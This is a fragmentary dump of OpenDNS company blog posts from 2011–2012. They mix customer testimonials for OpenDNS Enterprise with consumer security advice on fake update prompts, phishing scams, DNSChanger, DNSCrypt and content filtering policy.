is found on a whopping 50 percent of college campuses in the U.S.\nIf you’re using OpenDNS at work and want to share your story, Email us.', 'Announcements;Field Reports', 'https://umbrella.cisco.com/blog/2012/05/16/field-reports-why-a-leading-university-replaced-blue-coat-with-opendns-enterprise/');

Well, if that’s the case I’m here to make sure you add one more item to your pre-travel checklist: update your computer software.\nWait, what? Why, you ask?\nThe FBI recently issued a warning to travelers about the possibility that travelers may receive fake and malicious software update messages upon connecting to wireless networks at hotels. While the warning did not provide specific information regarding which hotels, countries, or software were being targeted, it appears the cyber criminals have found a backdoor into the connection process which typically involves a guest opening a web browser, entering in login information, and accepting a terms of service prior to being connected to the Internet.\nThe fake software update messages are reported to be for popular software that people would recognize and likely have installed on their computers, therefore reducing the likelihood of user suspicion about the notification.\nSo how can you protect yourself from this type of threat while traveling?\nWhile updating your computer software before leaving on your trip is recommended, it isn’t completely unheard of for developers to release another new update in some cases (usually for a bug fix), a day or two later. As someone who is a proponent of making sure your software is always up-to-date, if you do receive a familiar software update notification while traveling you should go directly to the software developer’s website and download the update directly from them or their trusted partners. This will help ensure your computer’s security.\nThat being said, if you receive an unfamiliar update notification while traveling and are unsure about it, it is definitely advised to err on the side of caution and ignore it. The FBI is also encouraging people who encounter this to report it to the local FBI office.\nOf course, additional security measures such as having up-to-date anti-virus software installed are recommended. Always, always run OpenDNS and make sure your coworkers and family do the same. (OpenDNS Enterprise has industry-leading malware protection.)

In this release, one of the company’s core focuses is security.\nWhile Mac growth has been great for Apple, it has become clear that due to the increased adoption of OS X, malware creators have started to take an interest in developing malware for the Mac. And make no mistake, Apple is well aware of this growing threat.\nSo how does Apple plan to help stop malware from becoming a problem on the Mac? The answer is: Gatekeeper. Gatekeeper will offer Mac users three distinct security features:\nMac App Store: This setting will only allow you to install and run only apps that are downloaded from the Mac App Store. As a proponent of the Mac App Store, I think this is a great solution for more novice computer users. While not all developers are onboard with submitting their software to the Apple-run store, developer participation in the store is increasing. In fact, a recent report stated that there are now 10,000 applications in the Mac App Store.\nMac App Store and identified developers: This setting is slightly different than the previous one because it allows you to install and run apps from the Mac App Store and apps that have a verified Developer ID. This means you are able to also download applications outside the Mac App Store provided they are signed with an Apple Developer ID. In order to obtain a Developer ID, the developer must be registered for the Mac Developer Program where Apple will assign them a unique ID for their apps. The ID will then be used to verify that the app you downloaded from the Internet has not been tampered with in any way, therefore ensuring its integrity.\nAdditionally, if you did happen to download an app from the Internet that was not signed with a Developer ID, Gatekeeper will inform you so you can then decide whether or not to install it.\nAnywhere This setting will allow you to install all apps from anywhere, just as you can today. In other words, with this setting you are not limited to the Mac App Store or apps only signed by trusted developers, you can download and install anything you want without being bothered.\nWhile Apple would most likely love every Mac user to use the Mac App Store only setting it might not currently be a realistic hope. There are a few reasons why:\n1. Apple has several requirements that developers must adhere to in order to be accepted into the Mac App Store. All developers might not want to comply.\n2. Certain applications may require additional system accessibility in order to function properly and may not be approved into the Mac App Store (even if developers want to be in the store).\n3. Some developers may not be willing to share 30% of their earnings to Apple to be listed in the Mac App Store.\nBecause of this there will be many users who select one of the other two settings, therefore potentially exposing their computer to malicious software. Gatekeeper is an interesting idea and a good start for Apple, but it’s critical that Apple continues to focus on security as more people make the switch.', 'Security 101', 'https://umbrella.cisco.com/blog/2012/05/09/coming-soon-to-a-mac-near-you-gatekeeper/');

DNSCrypt, available initially only for Mac, works by encrypting all DNS traffic between you and your DNS provider, OpenDNS. That critical path between you and your DNS servers is often referred to as the “last mile.” It’s in this “last mile” that bad things are most likely to happen — snooping, tampering, or even hijacking traffic. Anyone who knows what they’re doing can eavesdrop on your Internet activity and see exactly which domains you are resolving, and in many cases, what websites you’re visiting. Worse, sophisticated attackers can modify responses and redirect you to malicious sites. We have always used various techniques to thwart this, but none as iron-clad as simply encrypting all the communication between you and OpenDNS.\nThe effect of DNSCrypt is immediate and adds significant privacy and security to your Internet connection, particularly when you’re accessing the Internet on a public WiFi network at a place like a coffee shop or airport.

There’s gorgeous, natural light pouring in through the windows, which, during baseball season, also let in the sounds of the SF Giant’s earning a spot at the World Series. We have sitting desks, standing desks, booths, conference rooms, lounges, kitchen’s and more.

A PR person chatting up an HR person, or a customer support person and a sales person talking about how to improve our service. That’s why the office is peppered with areas for these conversations to happen.\nSince 2007 we’ve been growing almost entirely out of the revenue generated by our operating activities. This is an important thing to note for us because we believe building a sustainable business is important to our long-term success.

Or, how to not lose Internet on July 9', 'David Ulevitch, Founder/CEO', 'May 3, 2012', 'It’s been said that DNSChanger is one of the most prolific malware attacks in history. At its peak it infected many millions of computers, belonging to people all around the world. It uses malicious DNS servers that automatically and involuntarily convert the DNS settings of infected computers, then uses that control to redirect valid URLs to malicious sites. So if you or someone you know is infected, you effectively have zero control over Internet navigation and can’t trust that the websites you’re visiting are legitimate. Some reports claim that more than half of the Fortune 500 companies showed signs of infection and it’s said that the Estonian crime ring operating DNSChanger profited $14 million in stolen funds.\nLaw enforcement outsmarted the people behind DNSChanger and took over operation of the malicious servers late last year. After multiple extensions, they’ve announced a firm date of July 9 for when they’ll cease operation. On that date, the nearly half-million people still infected will not be able to connect to the Internet. And they’ll likely have no idea why.\nWe recently put our heads together with our friends from Cloudflare to see how to better warn infected users that their Internet would effectively break on July 9th. While OpenDNS’s services reach individual Internet users in 1 in 3 U.S. public schools, Fortune 10 enterprises and hundreds of thousands of homes around the world, CloudFlare’s service secures and accelerates hundreds of thousands of websites. Recognizing we’re collectively in a unique and opportune position to both help get the word out and guide people safely over to OpenDNS’s secure, fast and reliable DNS servers, OpenDNS has partnered with CloudFlare to deliver a solution. Think of this as a sort of Internet “Emergency Broadcast System” that leverages CloudFlare’s large reach across the web to communicate a message to those infected with DNSChanger, and OpenDNS’ ability to help protect those users.\nHere’s how it works:\nStarting this morning at 8 a.m. Pacific time, people who are infected with DNSChanger visting a participating website will see a banner in their browser window that notifies them of the infection and points them to http://www.OpenDNS.com/dns-changer.\nOn that page Internet users with infected computers will find instructions for disinfecting and removing DNSChanger and then switching to OpenDNS, or another safe DNS service of their choosing. Generally, you have two choices — you can use the DNS servers provided by your ISP (usually these DNS servers are assigned automatically) or use a third-party DNS service.\n___________\nInstructions for switching to OpenDNS are here. \nCommunications efforts put forth thus far have reached many people, but failed to reach a significant number who still remain infected — nearly a half-million people. It’s also worth pointing out that the FBI should be commended for running the DNSChanger DNS servers for this long — they could have shut them down long ago. We’ve invested the resources in this effort because first and foremost, our mission is to deliver a better Internet. Not just to our tens of millions of users, but to the Internet at large.\nYou can read CloudFlare’s blog post about this here: http://blog.cloudflare.com/cloudflare-opendns-work-together-to-save-the', 'Announcements;Community;Security 101', 'https://umbrella.cisco.com/blog/2012/05/03/opendns-cloudflare-dnschanger-solution-or-how-to-not-lose-internet-on-july-9/');

However, the product could not accommodate the growing demand in Web traffic that SHSD 161 was seeing and it increasingly created bottlenecks. When the SHSD 161 team looked to Barracuda Networks for a replacement solution, they learned that the price had skyrocketed.\nThe team searched exhaustively for a new solution, and ultimately determined OpenDNS Enterprise to be the best choice for protecting their seven schools and administrative office. Why? The team tells us OpenDNS Enterprise is, “the easiest to deploy, lowest total cost of ownership overall, with no network bottlenecks due to changes in traffic demand, and high reliability.”\nSHSD 161 operates a defense-in-depth security strategy, so because OpenDNS Enterprise delivers an Internet-wide security solution that also adds a layer of malware protection, it gives SHSD 161 significant additional value.\nThe SHSD 161 team says, “We would definitely recommend OpenDNS Enterprise.

Prior to deploying OpenDNS Enterprise, Roka Bioscience was using a Websense appliance for Web filtering but the cumbersome appliance was too demanding for the small team to manage.\nWe asked Daniel Churco, the information technology manager for Roka Bioscience why his team started searching for a solution to replace Websense. He explained, “We were previously using Websense but found the appliance-based system to be time-intensive. Internet security is a top priority for our company, so we needed a hands-off solution that could easily be managed by our smaller team.”\nIn addition to the difficulty of managing the bulky Websense appliance, the small team also devoted significant resources to cleaning up malware infections. After evaluating alternative solutions from Websense and Barracuda Networks, the Roka Bioscience IT team selected OpenDNS Enterprise because they found it to be the ideal, low-touch solution for a small team that prioritizes Internet security but can’t spare resources for complex management.\nSince switching to OpenDNS Enterprise, Roka Bioscience’s IT team has also reported significantly improved security and reliability.

Usually it is very hard to estimate the number of infected machines in widespread attacks because of Network Address Translation, DNS servers, Proxy Servers, and other machines that could have hundreds or thousands of hosts behind them. For Flashback however, the attackers are using a unique identifier within their user-agent string. This is most likely is a way for them to track infections or perform more advanced Command and Control (C&C).\nOur large distributed network of DNS servers allow us to immediately stop the C&C by prohibiting the infected host from phoning home.

Additionally, OpenDNS Enterprise protects all devices accessing the E-Z Rent-A-Car network, so even if an employee brings a personal device such as a laptop or iPad that is already infected, the malware can’t communicate back to command and control.\nThe E-Z Rent-A-Car team had this to say: “Because there were no appliances to install or software to setup, we were able to quickly deploy OpenDNS Enterprise to all 15 U.S. locations. Since everything happens in the cloud, I can easily make changes on the road, from any Internet-connected device, through my Dashboard.”\nNow that was E-Z ', 'Announcements', 'https://umbrella.cisco.com/blog/2012/03/28/field-reports-how-a-growing-rental-car-agency-is-making-malware-protection-e-z/');

The malware infections were resulting in troublesome network downtime and data loss for its customers, and required the SymQuest Group team to perform time-consuming clean-up.\nThe team determined that they needed to add a sophisticated malware-prevention solution to their security tool belt, but because the MSP has such a large network of clients, it was imperative that the solution wouldn’t increase complexity or overhead.\nEnter OpenDNS for Managed Service Providers. The program allows SymQuest Group to deploy OpenDNS’s security solutions in just moments and all customer accounts to be easily managed from any Internet-connected device through a single Web-based dashboard.\nOpenDNS for Managed Service Providers is also the only program that allows MSPs to deploy a solution that proactively blocks malware infections and transmissions by preventing both inbound malware infections and outbound botnet communications. This allows MSPs to focus on prevention, instead of spending valuable hours cleaning up their clients’ networks. Today SymQuest Group is using OpenDNS for Managed Service Providers to leverage OpenDNS’s business solutions, a “first layer of defense” to fight malware and provide comprehensive Web filtering for their customers.\nBut don’t take it from us. Here’s what the pros at SymQuest Group have to say: “OpenDNS’s security solutions are the standard in the market for this unique type of malware protection.

That’s why in today’s edition of Field Reports we’re taking a look at a network of community college campuses that turned to OpenDNS Enterprise to effortlessly protect all of their students – and all of their students’ devices.\nLike most higher education organizations, Tri-County Technical College had minimal filtering needs beyond their goal of prohibiting access to sites known to transmit malware and other Internet threats. But, securing 6,000 users across four campuses placed a heavy tax on network performance. From rampant malware infections stemming from student-owned devices, to skyrocketing bandwidth consumption, the team was searching for a highly scalable, cloud-based security solution that could be quickly deployed and easily managed.\nThere was only one option in the marketplace that could secure not just the college’s managed devices, but student-owned devices as well: OpenDNS Enterprise.\nOpenDNS Enterprise is also the only service capable of not only preventing access to known malicious sites, but also eliminating communication between an infected device and its online host. This means that without downloading any software, all unmanaged devices on the Tri-County Technical College network, such as a student-owned iPads or faculty members’ personal laptops, are prevented from downloading malware and transmitting malicious communications.\nIf you ask the folks responsible for deploying OpenDNS Enterprise at the college, they’ll tell you OpenDNS Enterprise was the only choice that made sense.\n“We looked at countless appliances, but our bandwidth needs would make it nearly impossible to scale at a reasonable price.

For many community colleges throughout the U.S., proactive cost-savings strategies involve making due with outdated products and services or worse, doing away with essentials. That’s why in this edition of Field Reports we wanted to highlight a success story that results from pursuing a new product – OpenDNS Enterprise.\nBefore deploying OpenDNS Enterprise, DCC did not have a malware prevention strategy in place. Although it had extensive anti-virus protection, malware infections were dealt with manually as they were identified. How then, could purchasing a new solution add up to savings? Because the manual malware cleanup created a considerable tax on the IT team’s resources and took them away from other improvement projects. As concerns over security and reliability mounted, the DCC IT team was searching for a solution that would give them a more proactive malware prevention strategy and help them save time and money that would otherwise be spent cleaning up infections.\nLike many network administrators, Shane Bishop, Director of Technology for DCC, discovered OpenDNS Enterprise because he was already using OpenDNS Premium DNS for the fastest and most reliable DNS available. When his team began exploring malware prevention solutions, OpenDNS Enterprise was the obvious stand out. That’s because OpenDNS Enterprise malware protection prevents both inbound malware infections and outbound botnet communications so it’s no longer necessary for the team to perform extensive malware cleanup, and time can be spent improving and optimizing existing technology programs.\nShane explains why OpenDNS Enterprise made so much sense for DCC: “We don’t have spare resources for cleaning up malware infections, so our preferred strategy is to keep our network airtight,” said Bishop. “With OpenDNS Enterprise, our approach has shifted from being reactive to being proactive, saving us time and money in the process.

When I have filtering rules set for one property such as our University Inn hotel, I can easily copy them over to our other property, The Watertown hotel, with just the click of a button, even though I may be hours away from these hotels at the time”\nIf you’re using OpenDNS at work and want to share your story, give us a shout.

In the 15 years she’s been participating in online communities, gaming, and social media to connect with other parents and grow her businesses, she has become an expert in social platforms. We asked Leonie to share her wisdom with the OpenDNS users who want improved security at home and the parents who want to better understand online risks like cyber bullying.\n\nOpenDNS: What do you think are some of the most pressing threats to kids’ online safety?\nLS: One of the biggest threats I see is that kids run across unsavory or adult content without really trying. Beyond that, kids can unknowingly interact with adults and cyber bullies through chat rooms, social media and online gaming social media. Many parents don’t know the extent of communication that’s available online today, and this lack of understanding makes their families more vulnerable. The most important thing to realize, is that there are simple steps parents can take to educate themselves and improve the odds of keeping their kids safe online.\nOpenDNS: What can parents do to better understand the threats their kids are facing?\nLS: The first parents can take is to get involved early. I’ve met lots of parents that think their kids are too young or don’t use computers. But, I’ve seen plenty of toddlers playing with an iPhone or iPad to keep them entertained at a cafe or on an airplane. Parents should change they way they think about “computers” and start thinking about protecting all Internet-connected devices. The next step is to find out what their kids love about computers share the online experience with their kids. They can play games or do research on interesting topics online together. It’ll help parents understand what they don’t know about the Internet, so they can do their homework. It’s also completely okay to acknowledge that the Internet is complex and even home IT security may require the help of an expert.\nOpenDNS: If you could only give parents one piece of advice for protecting their kids online, what would you tell them?\nLS: Start talking to your kids while they’re young so that you have an open dialogue happening about the Internet before your kids are teens. It’s important that they know they can come to you if they’re being bullied online, if they download a virus, or if someone is making them uncomfortable online so you can stop it before something bad happens. Help them understand that you’re there to help.\nOpenDNS: On your website families can find information on how to deal with cyber bullying. How serious has cyber bullying become and what can parents do?\nLS: Teachers and school administrators I talk to tell me it’s the number one problem they face on a daily basis, and unfortunately, cyber bullying is much worse than even statistics reveal. That’s because so many kids don’t report it out of fear that their Internet/phone/computer will be taken away or that their parent will go to the school or the bully’s parents and make the situation worse. Parents need to ensure their children feel safe to tell them about any cyber bullying they experience. Parents can get started by carefully explaining to kids what Cyber Bullying is, and that it is not the fault of their child. It’s also very tough to say this to parents, but it’s important that they keep an eye on their kids to ensure they are not bullying others.\nOpenDNS: Why do you suggest OpenDNS Parental Controls and OpenDNS Family Shield to families and parents over other available options?\nLS: I suggest OpenDNS to families because its the only way I know to protect your Internet from unsavory and suspect sites on all devices that are accessing the Internet from your home Wi-Fi. You  can certainly put parental controls on all devices at home to restrict children from accidentally or purposely accessing inappropriate sites, but that will fall down as soon as a guest comes into your home with a device like a laptop or iPod or tablet that doesn’t use your preferred settings. OpenDNS protects your phones, your iPad, your iPod, and all your computers from accidentally accessing Adult or unsavoury sites. You can set the filter according to your needs, and allow certain sites through if you wish. I recommend OpenDNS in conjunction with open dialogue, education, awareness and supervision.\nWant to answer five questions for OpenDNS?

OpenDNS is present on a whopping 50% of U.S. college campuses. As we continue our Field Reports series, we thought it would be a great time to take a look at why OpenDNS Enterprise is the choice of colleges and university network administrators.\n\nLike most colleges and universities, Southwestern Michigan College had minimal filtering needs. Aside from keeping the real unsavory aspects of the Web off of public workstations, the school’s real goal was preventing access to sites that hosted malware or other Internet threats. However, the school was paying a high price for Websense content filtering appliances and more bells and whistles than they could use. The community college with two campuses, hundreds of wired workstations, and countless student-owned Internet-connected devices wanted to add an extra layer of defense against today’s malicious Internet climate, but protecting student-owned devices wasn’t something they could do with their Websense appliances.\nAs Internet-connected devices continue to proliferate, it’s no longer uncommon for students to take notes on their laptops, iPads or even their Android phones. Because these devices are used both for work and for play, and roam off and back on to the school’s secure network, they are at a much higher-risk of malware infection. This makes the job of the school’s IT team — protecting the network from malware, and keeping students safe — much more difficult. That’s why the college’s IT team turned to OpenDNS Enterprise.\nAside from providing straightforward and easy-to-manage Web filtering, OpenDNS Enterprise is uniquely capable of both preventing access to sites that host malware, and ensuring devices that are already infected can’t communicate back to their online hosts.\nThe good folks who managed the set up of OpenDNS Enterprise for Southwestern Michigan College explained: “Our filtering requirements are minimal so we could no longer see the value in paying for a product like Websense. OpenDNS Enterprise not only meets our filtering needs in a straightforward way, it gives us an added layer of protection for our students by blocking malware. That makes it a much better value than anything we’ve used in the past.” You can read more about how Southwestern Michigan College is using OpenDNS Enterprise here.\nIf your company is using OpenDNS Enterprise to solve an interesting problem, give us a shout at Success@OpenDNS.com.

Or a network admin’s nightmare?', 'Allison Rhodes', 'February 3, 2012', 'The Domain Name System was developed more than 30 years ago as a way to ensure that the brilliant network we now know as the Internet could scale and see adoption. Before the DNS existed, Internet users would need to remember the IP address for every website on the Internet. Research has shown that seven digits tends to be the capacity for human memory (think phone numbers, sans area code) and IP addresses can be twelve — more now with IPv6. The DNS is part of the Internet’s infrastructure, earning it the somewhat unflattering analogy of the plumbing of the Internet. But in truth, its primary role has traditionally been that.\nRecently ICANN, the global body that oversees the Internet and authors its policies, announced a plan to make available a throng of new top-level domains. Preexisting TLDs include .com, .net, .org, .co.uk, among many others. Twenty-two in total. The new ones are seemingly designed primarily to help businesses and spur economic activity. The new domains can be grouped into two classifications:\n– .xxx: Designated for websites that include pornographic content as a way to easily differentiate them from non-pornographic sites.\n– Generic TLDs, or “gTLDs”: Basically turns any brand or term into its own TLD. .Pepsi, .Apple, .Football or .Money, for example.\nThe release of both new groups of TLDs raises interesting issues for OpenDNS. Today we are the largest recursive DNS provider in the world, with more than 30 million people using our service. (Nearly doubling our traffic in the past 1.5 years.) We’re the innovator in the DNS space, as we introduced the concept of building security directly into the Domain Name System. Phishing protection came first, followed by typo-correction that helps people route around typo-squatting. Then Conficker protection and most recently, the most game-changing malware-blocking service, available to users to OpenDNS Enterprise.\nBut as we’ve seen countless times, with more ground to cover comes more fraud and crime. Many critics of ICANN’s move to add more domains see the potential for more:\n– Cyber squatting, which is the practice of registering a domain using a trademarked brand that doesn’t belong to you. Highly annoying to Internet users and costly to brands.\n– Typo squatting, which is like cyber squatting, but using a typo’d variation of the trademarked brand. Also highly annoying to Internet users and costly to brands.\n– And generally more cyber crime and confusion among Internet users created by a change to the way domains are structured.\nWe’ve often said that the bad guys on the Internet tend to be one step ahead of the good guys, making the task of delivering an effective security service both very challenging and in a constant state of evolution. So when supporters of ICANN’s move argue that ICANN has no intention of allowing the new domains to act as a platform for crime, we can appreciate the perspective, but have little confidence that will ultimately be the case. Cyber squatting and cyber crime account for more than $1B in revenue annually, and when that kind of money is at stake, the bad guys find a way to be effective. Scott Pinzon, director of marketing and outreach at ICANN offers the perspective that, “new gTLDs represent a platform for innovation.” And goes on to say, “no one can predict what smart people will do with them. Lots of new business models will be invented. Some will work. Some won’t.” We agree with Scott, but also have a front row seat to the counterpart, sophisticated criminal activity that follows innovation.\nSome of you will remember when the country of Cameroon was opportunistically assigned the .cm TLD and wildcarded all .cm domains. The country made a nice profit, but it confused masses of Internet users who’d accidentally made a typo when trying to get to a .com. We acted swiftly and delivered a feature that automatically redirected you to .com when you typed .cm.\nIn relation to the recent ICANN changes, there’s a great deal we can do as your DNS service to help ensure the Internet remains a safe place for you and yours to browse. It’s unclear at this point how successful these new domains will be and how much traction they’ll see, especially because at an upfront fee of $185k, the new gTLDS are not accessible to everyone.\nHave thoughts on the topics above? Agree, or passionately disagree? Predictions for what kind of repercussions the Internet will see? We’d love to hear them in the comments.\nHow to Block .xxx Using OpenDNS:\nIn the immediate term, users of OpenDNS services with content filtering that want to block all .xxx domains on their networks can follow a few simple steps. Simply locate your “always block” or blacklist and add “xxx” (without the dot).

Today, I’d like to talk a little more about how our malware and botnet protection works, and why we’ve started seeing so many organizations move to OpenDNS Enterprise primarily for that added layer of internet security.\nAs with all of the advanced functionality OpenDNS has built atop our superfast recursive DNS service for businesses and schools – like the Web content filtering, phishing protection, and stats available in OpenDNS Enterprise —  our malware and botnet protection innovates on traditional offerings, and it works on any device connected to the network (including, say, an iPad that an employee brought from home).\nOpenDNS blocks malware and botnet attacks before they can infect a network. We aren’t terminating an existing malicious connection, or cleaning up a breach that’s already occurred; as soon as OpenDNS sees an attempted connection to a malicious domain or IP address, we block it. A side benefit is that if an infected device is brought on to a protected network, OpenDNS can make sure that the infection doesn’t spread to other connected devices on the network if they do so via external command and control.\n\nOpenDNS Dashboard Malware Notice\nIf you’re wondering why this matters: when Vanderbilt University switched to OpenDNS Enterprise in 2010, they blocked 1.5 million malware attacks in the first four months following the deployment. That’s 1.5 million potential data leaks thwarted, and 1.5 million device cleanups avoided.\nIt’s certainly something to think about, as the threat of malware and botnet attacks continues to escalate.  If you don’t have any malware or botnet protection for your organization, or you’re thinking about adding another layer of protection to your network, consider trying out OpenDNS Enterprise as your first line of defense.', 'Security 101', 'https://umbrella.cisco.com/blog/2012/02/02/the-advantages-of-malware-botnet-protection-at-the-dns-layer/');

Operating more than a dozen luxury motor coaches, and serving a wide variety of groups that charter the buses and join the tours, the Safer’s Tours IT team was faced with an interesting challenge: How do you secure the Wi-Fi hotspot on a moving target? The team exhausted countless ideas for how they could conserve precious bandwidth onboard the buses, and prevent malware from being downloaded over the network, but they continued to encounter the same two issues: Installing appliances on every bus is cost prohibitive, and no adjustments or monitoring could be made to the network while the buses were in motion.\nAs luck would have it, Tim Watson, IT manager and safety director for Shafer’s Tours, was separately evaluating OpenDNS Enterprise for use on Shafer’s Tours corporate network. He quickly realized that the unique way OpenDNS Enterprise handles content filtering and malware protection makes it the ideal solution for securing his moving targets, too. In no time, his team was able to set up OpenDNS on both Shafer’s Tours’ corporate network and the individual WI-Fi hotspots for the buses without installing any appliances or provisioning any software. And, because OpenDNS Enterprise settings can be changed remotely, and updates are delivered in real-time in the cloud, they don’t have to worry about waiting for buses to return to home base to make changes.\nSince setting up OpenDNS Enterprise, the Shafer Tours IT team hasn’t looked back.

Brush up, take note and avoid getting duped.\nScam: Air Travel Deals\nWith so many travelers still scrambling to buy last-minute air tickets, it’s important to be extremely careful when clicking through to an airline’s website from a promotional email. Phishing websites like this one spoofing American Airlines are not legitimate. The URL for this one, www.aa-advantager.com, is the giveaway — even though it’s close to the real domain (www.aa.com).\n\nScam: Holiday Shopping\nIf you’re like me, you’re doing most of your holiday shopping online this year. So it’s no surprise that scammers are spoofing websites like eBay (one of the most spoofed brands in phishing scams all year long) and trying to trick shoppers into entering their login credentials. When doing shopping online, the safest way to get to your destination site is to type its URL directly into your address bar.\n\nScam: Money Transfers\nFor better or worse, lots of people skip the gift buying altogether and just give cash. That’s why we’re including money transfer-themed phishes on our list. We can’t stress enough: any time you deal in currency online, be extra careful. The safest way to get to a website is to type its URL straight into your address bar.\n\nScam: Connect with Loved Ones\nNo doubt Skype usage increases during the holidays when the revolutionary service is used to see the smiling faces of family members abroad. But we all need to take great caution when phishes this sophisticated exist. Note that while the URL (http://skype.host.org/account/signin_form.php) is very convincing, it’s not the real Skype domain.', 'Security 101', 'https://umbrella.cisco.com/blog/2011/12/20/top-2011-holiday-phishing-scams-to-watch-for/');

It has a simple but important function: encrypt all DNS traffic between you and OpenDNS. Nothing else like it exists, and we have very high expectations for the positive impact it can have on the Internet security and privacy of millions of people around the world.\nDNS is a critical part of the Internet’s infrastructure, and though a good deal of attention has been paid to improving its security in recent years with DNSSEC, an important part has been overlooked.  It’s what’s often referred to as the “last mile,” or the connection between you and your ISP or your DNS provider, if you use a DNS service like OpenDNS.  It’s in this “last mile” that bad things are most likely to happen — snooping, tampering, or even hijacking traffic. Anyone who knows what they’re doing can eavesdrop on your Internet activity and see exactly which domains you are resolving, and in many cases, what websites you’re visiting.\nIt happens all the time on insecure networks at coffee shops, and even residences. Some ISPs have even been accused of spying on their customers’ activity. What’s worse, the “last mile” is ripe for man-in-the-middle attacks, where an intermediary injects themselves into your traffic path masquerading as your intended destination, but all the while, being able to see and modify your traffic. This leaves little confidence for the Internet user.\nDNSCrypt changes this and has the potential to completely revolutionize Internet security. DNS has, unfortunately, always had some inherent weaknesses because it’s transported in plain text. DNSSEC has never attempted to address that (crazy, I know).  Encrypting all DNS traffic means a fundamental change to the security of the system on the whole and a strong improvement.  It’s not the only solution, and there’s still an important place for verification and validation of domains like DNSSEC provides, but it’s a very strong first step.\nWe’ve been sharing DNSCrypt with security experts over the past several weeks and the feedback has been phenomenal. A tool like DNSCrypt is critically necessary to ensure the security of DNS going forward. DNSCrypt is a “technology preview” today, and the code is being open-sourced.  For the über-nerds, our implementation is the first (known) implementation of the forwarder ideas expressed in the DNSCurve community, which many will recall, we were one of the first to implement.\nDownload DNSCrypt today and try it for yourself.', 'Announcements', 'https://umbrella.cisco.com/blog/2011/12/06/dnscrypt-critical-fundamental-and-about-time/');

It’s a huge badge of honor to wear. So who are they and what do they do?\nTo better explain what a moderator does, let’s quickly revisit the process for how domain categorization works. First, someone submits a domain (or website) to be classified into the most appropriate of OpenDNS’s 57 categories. Users then vote on how the domain should be categorized.  After a certain voting threshold is reached, which varies from category to category, the moderator steps onto the scene.  Moderators thoughtfully review the websites, with their keen eyes and Internet prowess, and make a final decision on categorization. The domain is then “tagged” in the appropriate categories and blocked for anyone who has chosen to enable filtering of that category.\nSo what does it take to be a moderator? Well, you don’t necessarily need a Ph.D. in computer science, a job at NASA or fluency in HTML. Our current team of moderators is made up of people from nearly every profession, including (but not limited to) OpenDNS staff members, SysAdmins, software engineers and even stay-at-home parents. And OpenDNS moderators live in places all over the world, including India, Brazil, Italy, Canada, Switzerland and more.

J.F. Shea Co., its parent company, is also using OpenDNS Enterprise. For us, its hugely exciting that the company America trusts to build our homes and engineering marvels has trusted OpenDNS Enterprise with the task of protecting its networks and employees from malware and unsafe content.\nIt’s no easy task to be one of the nation’s largest and most respected homebuilders and civil contractors. Aside from a strong commitment to excellence and customer satisfaction, and building global landmarks like the Golden Gate Bridge and Hoover Dam, it also means a constant and significant amount of corporate growth. For Shea Homes and parent company J.F. Shea Co, keeping up with that rapid growth meant purchasing, deploying and managing new malware protection and content filtering appliances for its various networks every time a new office was added, or more bandwidth was needed. The company and its subsidiary were stuck in an ugly cycle of appliance management, a story that’s all too familiar for many rapidly growing organizations. But escaping the cycle was not only easy, it resulted in significant savings of both time and resources.\nThe J.F. Shea Co. and its divisions were early adopters of cloud-based services like OpenDNS Enterprise because the move let the companies free up significant IT budget and time, and downsize datacenters across their distributed locations. This was especially significant during the economic downturn that left the building industry particularly hard hit. Notably, J.F. Shea Co.’s cloud-based evolution was rooted in the transition to OpenDNS Enterprise. Shea Homes soon followed by adopting OpenDNS Enterprise for all of its North Carolina locations. The organizations not only leverage OpenDNS Enterprise for its unique ability to block malware and botnets at the DNS level, but also for the added protection the organizations receive by filtering malicious sites that are frequently the sources of such malware.\nUsing OpenDNS Enterprise afforded J.F. Shea Co. a savings of more than $25,000 and gave Shea Homes the ability to downsize its datacenters and let its IT team focus more closely on proactive maintenance. We’re excited to say that OpenDNS Enterprise does this each day for companies large and small.

What we know is that Sky, British Telecom, TalkTalk and Virgin have teamed with Prime Minister David Cameron to make it easier for parents to block pornography.\nWhat we don’t know is whether filtering of pornographic websites will be on by default, with the option to be disabled, or off by default, with the option to be turned on. We also don’t know how, technically, the filtering will be executed.  And related, how difficult it is to bypass.  We don’t even know how “pornographic” will be defined.\nEven without knowing any of that, I can say with relative certainty that this is an idea that won’t work and shouldn’t be done.  More on that in a moment, but first, a comment on how some people use OpenDNS.\nSomething we don’t talk about often is the dual nature of OpenDNS’s benefit to our 30 million-plus customers around the world. While a good portion of those folks use OpenDNS to filter content and keep their kids safe online, many people in countries like Algeria, Egypt and Turkey use OpenDNS for an entirely different and even opposite reason. Those countries happen to be three of the top government-imposed Internet-censoring countries in the world and our customers who live there are often able to use our service to access the wide-open Internet.  It allows them to quickly and easily bypass government-imposed filters that are done through the DNS.  We fully support that and believe that people should control their own means of accessing the Internet.\nBack to this UK porn filtering idea.  We believe filtering should happen at the edge.  The edge means the “last mile” where your home or computer connects to the Internet, or where your office connects to the Internet.  Doing filtering at the ISP level is what I would describe as “the core.”  We don’t think ISPs or Government should mandate what you can and cannot access, nor should they modify or censor packets that leave your network.  We’re thrilled to be the choice of millions of people who want to block malware, botnets, and sometimes even pornography on their network, but we would never want usage of OpenDNS to be mandated by the Government.  We prefer when our customers choose us and when our customers set us up themselves.\nOpenDNS has become part of the discussion in the UK today because many have pointed out that we do what Cameron is trying to do with the new filter. There are important differences though.  It’s true, OpenDNS can be enabled today in every household in the UK with children, empowering parents to block what they deem unsafe or inappropriate for their family. But OpenDNS can be configured differently for each household, as opposed to a blanket filter, which it appears is what is being proposed by the UK government.\nOur stance here is simple: We think parents should have the tools to keep their kids safe.  For some parents that means having access to content filtering tools, but for other parents it just means a conversation with their kids.  That’s a choice best left to parents, and we don’t think that any form of government intervention is appropriate here.', 'Announcements;Community', 'https://umbrella.cisco.com/blog/2011/10/12/the-role-of-government-in-content-filtering/');

Why did you choose OpenDNS over competitors?\nTM: I discovered OpenDNS because I was looking for a way to keep my family safe online. After further exploring OpenDNS business solutions, I realized it was ideal for many of my clients. Appliance-based systems are costly to set up and maintain. We had experimented with proxy-based web filtering, but that brought other issues.

